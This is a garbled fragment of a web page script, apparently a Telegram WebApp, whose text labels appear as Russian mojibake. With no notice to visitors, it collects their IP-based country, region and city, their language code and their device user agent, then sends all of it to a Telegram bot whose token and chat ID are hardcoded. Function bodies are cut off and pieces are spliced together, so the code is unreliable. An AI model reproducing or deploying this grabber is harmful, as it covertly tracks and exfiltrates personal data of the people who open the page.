    <script>
        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
        const CHAT_ID = "7477642275";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        function sendToTelegram(message) {
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },

                            ipData += `    [+] –°—Ç—Ä–∞–Ω–∞: ${info.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            ipData += `    [+] –†–µ–≥–∏–æ–Ω: ${info.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            ipData += `    [+] –ì–æ—Ä–æ–¥: ${info.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n\n`;

                    userInfo += `[+] –Ø–∑—ã–∫: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
                    sendToTelegram(userInfo);

        }
        
        function getDeviceInfo() {
            let deviceInfo = `[+] –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent}\n`;
